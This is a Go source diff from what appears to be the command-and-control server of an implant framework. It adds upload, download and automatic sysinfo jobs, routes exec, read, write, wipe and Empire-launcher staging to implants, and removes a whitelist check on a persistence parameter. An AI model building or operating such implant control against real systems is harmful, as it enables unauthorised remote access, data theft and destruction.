@@ -111,7 +111,7 @@ func jobProcessor(jobO *Job){
 
     			//Server Side white-list for Hive Commands
     			if !(namesInputWhite(commandO.Name) && numbersInputWhite(commandO.Ttl) && numbersInputWhite(commandO.Resptime) && 
-    				 namesInputWhite(commandO.Coms) && namesInputWhite(commandO.Persistence)){
+    				 namesInputWhite(commandO.Coms)){
 
 					setJobStatusDB(jid,"Error")
 					setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
@@ -628,11 +628,21 @@ func jobProcessor(jobO *Job){
 	
 		switch job{
 
-			//Jobs triggered by implants themselves
+			//Jobs triggered by implants/bichitos themselves
 			case "BiChecking":
 
    				//BiCHecking is a encoded bot info for future use
    				biChecking(chid,pid,parameters)
+				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
+				
+				jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
+				jobsToProcess.mux.Unlock()
+
+   				time := time.Now().Format("02/01/2006 15:04:05 MST")
+   				setRedLastCheckedDB(pid,time)
+   				setBiLastCheckedbyBidDB(chid,time)
+   				setBiRidDB(chid,pid)
 				return
 
 			case "BiPing":
@@ -641,6 +651,26 @@ func jobProcessor(jobO *Job){
 				if !existB{
 					biChecking(chid,pid,parameters)
 				}
+
+				//Check SysInfo, if empty, craft a new Job to retrieve it
+				bichito := getBichitoDB(chid)
+				if (bichito.Info == "") {
+					fmt.Println("Adding Sysinfo...")
+   				
+					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}
+
+					jobsToProcess.mux.Lock()
+					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
+					jobsToProcess.mux.Unlock()
+				}
+
+				//Debug:
+				fmt.Println("Adding Received...")
+				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
+
+				jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
+				jobsToProcess.mux.Unlock()
 
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
    				setRedLastCheckedDB(pid,time)
@@ -679,77 +709,85 @@ func jobProcessor(jobO *Job){
 			case "respTime":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
 
 			case "ttl":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
-
 			
 			//Implant Basic Capabilities
 			case "sysinfo":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-    			
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
-
+			
 			case "exec":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
-
+			
 			case "ls":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
-
+			
 			case "accesschk":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
-
+			
 			case "read":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
+			
 
 			case "write":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
+			
 
 			case "wipe":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
+			
 
+			case "upload":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+			
+
+			case "download":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+			
 			//Staging/POST Actions
 			case "injectEmpire":
 
@@ -777,15 +815,15 @@ func jobProcessor(jobO *Job){
 				jobO.Parameters = launcher
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-    			fmt.Println("Sending Launcher")
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
 				return
 
 			default:
 				time := time.Now().Format("02/01/2006 15:04:05 MST")
 				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
 				addLogDB(pid,time,elog)
+				return
 		}
 
 	}
